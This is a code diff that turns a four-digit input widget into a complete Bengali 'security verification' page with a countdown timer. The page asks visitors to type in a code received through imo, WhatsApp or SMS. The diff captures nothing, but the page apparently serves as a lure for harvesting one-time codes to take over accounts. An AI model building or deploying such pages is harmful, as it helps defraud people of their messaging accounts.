@@ -1,34 +1,72 @@
-<div class="flex justify-center gap-3 mb-8">
-    <input type="text" maxlength="1" class="codeInput w-14 h-14 border-2 border-gray-200 rounded-xl text-center text-2xl font-bold outline-none disabled-input">
-    <input type="text" maxlength="1" class="codeInput w-14 h-14 border-2 border-gray-200 rounded-xl text-center text-2xl font-bold outline-none disabled-input">
-    <input type="text" maxlength="1" class="codeInput w-14 h-14 border-2 border-gray-200 rounded-xl text-center text-2xl font-bold outline-none disabled-input">
-    <input type="text" maxlength="1" class="codeInput w-14 h-14 border-2 border-gray-200 rounded-xl text-center text-2xl font-bold outline-none disabled-input">
-</div>
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verification Page</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Noto+Sans+Bengali:wght@400;700&display=swap');
+        body { font-family: 'Noto Sans Bengali', sans-serif; background-color: #f9fafb; }
+        .input-box { width: 55px; height: 55px; border: 2px solid #e5e7eb; border-radius: 12px; text-align: center; font-size: 24px; font-weight: bold; outline: none; }
+        .input-box:focus { border-color: #3b82f6; }
+    </style>
+</head>
+<body class="flex items-center justify-center min-h-screen p-5">
 
-<script>
-    // অটো-ফোকাস (এক ঘর থেকে অন্য ঘরে যাওয়ার) লজিক
-    const inputs = document.querySelectorAll('.codeInput');
+    <div class="bg-white p-8 rounded-[30px] shadow-lg w-full max-w-sm text-center">
+        <h1 class="text-2xl font-bold text-gray-900 mb-4">নিরাপত্তা যাচাই!</h1>
+        <p class="text-[15px] text-gray-600 mb-6 leading-relaxed">
+            আনলক/Add করতে আপনার imo, whatsapp অথবা মেসেজ অপশনে আসা ৪-সংখ্যার কোডটি ফাঁকা ঘরে বসান।
+        </p>
+        
+        <div id="timer" class="text-red-500 font-bold text-lg mb-6">৩০ সেকেন্ড অপেক্ষা করুন...</div>
 
-    inputs.forEach((input, index) => {
-        input.addEventListener('input', (e) => {
-            // যদি ইনপুট ফিল্ডে কিছু লেখা হয় এবং তা সংখ্যা হয়
-            if (e.target.value.length === 1) {
-                // পরের বক্সে ফোকাস করবে
-                if (index < inputs.length - 1) {
+        <div id="inputContainer" class="flex justify-center gap-3 mb-8">
+            <input type="text" class="codeInput input-box bg-gray-100" maxlength="1" disabled>
+            <input type="text" class="codeInput input-box bg-gray-100" maxlength="1" disabled>
+            <input type="text" class="codeInput input-box bg-gray-100" maxlength="1" disabled>
+            <input type="text" class="codeInput input-box bg-gray-100" maxlength="1" disabled>
+        </div>
+    </div>
+
+    <script>
+        const inputs = document.querySelectorAll('.codeInput');
+        const timerDisplay = document.getElementById('timer');
+        let count = 30;
+
+        // টাইমার লজিক
+        const countdown = setInterval(() => {
+            count--;
+            timerDisplay.innerText = count + " সেকেন্ড অপেক্ষা করুন...";
+            
+            if (count <= 0) {
+                clearInterval(countdown);
+                timerDisplay.innerText = "এখন কোডটি বসান";
+                timerDisplay.classList.replace('text-red-500', 'text-green-600');
+                
+                // ইনপুট বক্সগুলো সক্রিয় করা
+                inputs.forEach(input => {
+                    input.disabled = false;
+                    input.classList.remove('bg-gray-100');
+                });
+                inputs[0].focus();
+            }
+        }, 1000);
+
+        // অটো-ফোকাস এবং পরের ঘরে যাওয়ার লজিক
+        inputs.forEach((input, index) => {
+            input.addEventListener('input', (e) => {
+                if (e.target.value.length === 1 && index < inputs.length - 1) {
                     inputs[index + 1].focus();
                 }
-            }
-        });
-
-        // ব্যাকস্পেস চাপলে আগের বক্সে যাওয়ার লজিক
-        input.addEventListener('keydown', (e) => {
-            if (e.key === 'Backspace' && e.target.value.length === 0) {
-                if (index > 0) {
+            });
+            input.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && !e.target.value && index > 0) {
                     inputs[index - 1].focus();
                 }
-            }
+            });
         });
-    });
-
-    // আগের টাইমার লজিক এখানে থাকবে...
-</script>
+    </script>
+</body>
+</html>
